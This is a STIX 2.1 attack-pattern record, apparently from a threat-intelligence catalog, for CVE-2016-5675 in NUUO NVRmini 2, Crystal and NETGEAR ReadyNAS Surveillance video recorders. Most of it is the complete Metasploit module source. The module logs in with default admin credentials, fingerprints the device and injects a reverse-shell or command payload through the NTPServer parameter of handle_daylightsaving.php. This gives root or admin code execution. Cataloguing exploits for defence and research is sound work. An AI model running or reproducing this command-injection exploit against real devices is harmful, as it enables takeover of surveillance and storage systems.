{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c2ed6442-69e7-4132-a2a8-580db648c734",
    "created": "2024-08-14T17:03:08.23115Z",
    "modified": "2024-08-14T17:03:08.231155Z",
    "name": "NUUO NVRmini 2 / Crystal / NETGEAR ReadyNAS Surveillance Authenticated Remote Code Execution",
    "description": " The NVRmini 2 Network Video Recorder, Crystal NVR and the ReadyNAS Surveillance application are vulnerable to an authenticated remote code execution on the exposed web administration interface. An administrative account is needed to exploit this vulnerability. This results in code execution as root in the NVRmini and the 'admin' user in ReadyNAS. This exploit has been tested on several versions of the NVRmini 2, Crystal and the ReadyNAS Surveillance. It probably also works on the NVRsolo and other Nuuo devices, but it has not been tested in those devices. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/nuuo_nvrmini_auth_rce.rb",
            "external_id": "nuuo_nvrmini_auth_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-5675"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/NUUO/nuuo-nvr-vulns.txt"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/bugtraq/2016/Aug/45"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'NUUO NVRmini 2 / Crystal / NETGEAR ReadyNAS Surveillance Authenticated Remote Code Execution',\n      'Description' => %q{\n        The NVRmini 2 Network Video Recorder, Crystal NVR and the ReadyNAS Surveillance application are vulnerable\n        to an authenticated remote code execution on the exposed web administration interface. An administrative\n        account is needed to exploit this vulnerability.\n        This results in code execution as root in the NVRmini and the 'admin' user in ReadyNAS.\n        This exploit has been tested on several versions of the NVRmini 2, Crystal and the ReadyNAS Surveillance.\n        It probably also works on the NVRsolo and other Nuuo devices, but it has not been tested\n        in those devices.\n      },\n      'Author' =>\n        [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module\n        ],\n      'License' => MSF_LICENSE,\n      'References' =>\n        [\n          ['CVE', '2016-5675'],\n          ['US-CERT-VU', '856152'],\n          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/NUUO/nuuo-nvr-vulns.txt'],\n          ['URL', 'https://seclists.org/bugtraq/2016/Aug/45']\n        ],\n      'DefaultOptions' => { 'WfsDelay' => 5 },\n      'Platform' => 'unix',\n      'Arch' => ARCH_CMD,\n      'Privileged' => false,  # Runs as root in NVRmini 2 / Crystal, admin in ReadyNas\n      'Targets' =>\n        [\n          [ 'Automatic', { } ],\n          [ 'NUUO NVRmini 2', {\n            'Payload' =>\n              {\n                'Space' => 1024,    # Actually it might be the GET request length, but this is a safe value\n                'DisableNops' => true,\n                'Compat'      =>\n                  {\n                    'PayloadType' => 'cmd',\n                    'RequiredCmd' => 'netcat generic perl'\n                  }\n              },\n          }],\n          [ 'ReadyNAS NETGEAR Surveillance', {\n            'Payload' =>\n              {\n                'Space' => 1024,    # Actually it might be the GET request length, but this is a safe value\n                'DisableNops' => true,\n                'Compat'      =>\n                  {\n                    'PayloadType' => 'cmd',\n                    'RequiredCmd' => 'netcat generic perl'\n                  }\n              },\n          }],\n          [ 'NUUO Crystal', {\n            'Payload' =>\n              {\n                'Space' => 1024,    # Actually it might be the GET request length, but this is a safe value\n                'DisableNops' => true,\n                'Compat'      =>\n                  {\n                    'PayloadType' => 'cmd',\n                    'RequiredCmd' => 'bash'\n                  }\n              },\n          }],\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2016-08-04'))\n\n    register_options(\n      [\n        Opt::RPORT(8081),\n        OptString.new('TARGETURI', [true,  \"Application path\", '/']),\n        OptString.new('USERNAME', [true, 'The username to login as', 'admin']),\n        OptString.new('PASSWORD', [true, 'Password for the specified username', 'admin']),\n      ])\n  end\n\n\n  def id_target\n    return target if target.name != 'Automatic'\n    res = send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'])\n    })\n    if res && res.code == 200\n      if res.body.to_s =~ /var VENDOR_NAME = \"Netgear\";/\n        print_status(\"#{peer} - Identified NETGEAR ReadyNAS Surveillance as the target.\")\n        return targets[2]\n      elsif res.body.to_s =~ /v_web_login_login_type/\n        print_status(\"#{peer} - Identified NUUO Crystal as the target.\")\n        return targets[3]\n      else\n        print_status(\"#{peer} - Identified NUUO NVRMini 2 as the target.\")\n        return targets[1]\n      end\n    end\n  end\n\n\n  def exploit\n    res = send_request_cgi({\n            'method' => 'POST',\n            'uri' => normalize_uri(datastore['TARGETURI'], \"login.php\"),\n            'vars_post' => {\n              'user' => datastore['USERNAME'],\n              'pass' => datastore['PASSWORD'],\n              'submit' => \"Login\"\n            }\n        })\n\n    if res && (res.code == 200 || res.code == 302)\n      cookie = res.get_cookies\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Failed to log in with the provided credentials.\")\n    end\n\n    my_target = id_target\n    if my_target == targets[1]\n      if payload.raw.include?(\"perl\")\n        fail_with(Failure::Unknown, \"The NVRmini 2 only supports generic or netcat payloads.\")\n      end\n      print_status(\"#{peer} - Executing payload...\")\n      send_request_cgi({\n          'uri' => normalize_uri(datastore['TARGETURI'], \"handle_daylightsaving.php\"),\n          'cookie' => cookie,\n          'vars_get' => {\n            'act' => \"update\",\n            'NTPServer' => rand_text_alpha(12 + rand(8)) + \";\" + payload.encoded\n          }\n        }, 1)\n    elsif my_target == targets[2]\n      if payload.raw.include?(\"netcat\")\n        fail_with(Failure::Unknown, \"ReadyNAS Surveillance does not support netcat payloads.\")\n      end\n      # We also have to fix the perl payload - there's an IO import error on the ReadyNAS that blows\n      # it up.\n      print_status(\"#{peer} - Executing payload...\")\n      send_request_cgi({\n          'uri' => normalize_uri(datastore['TARGETURI'], \"handle_daylightsaving.php\"),\n          'cookie' => cookie,\n          'vars_get' => {\n            'act' => \"update\",\n            'NTPServer' => rand_text_alpha(12 + rand(8)) + \";\" + payload.raw.gsub(\"-MIO \", \"-MIO::Socket \")\n          }\n        }, 1)\n    else\n      if not payload.raw.include?(\"exec\")\n        fail_with(Failure::Unknown, \"NUUO Crystal only supports bash payloads.\")\n      end\n      print_status(\"#{peer} - Executing payload...\")\n      send_request_cgi({\n          'uri' => normalize_uri(datastore['TARGETURI'], \"handle_daylightsaving.php\"),\n          'cookie' => cookie,\n          'vars_get' => {\n            'act' => \"update\",\n            'NTPServer' => rand_text_alpha(12 + rand(8)) + \";\" + payload.raw\n          }\n        }, 1)\n    end\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-08-04",
    "x_mitre_platforms": [
        "unix'"
    ]
}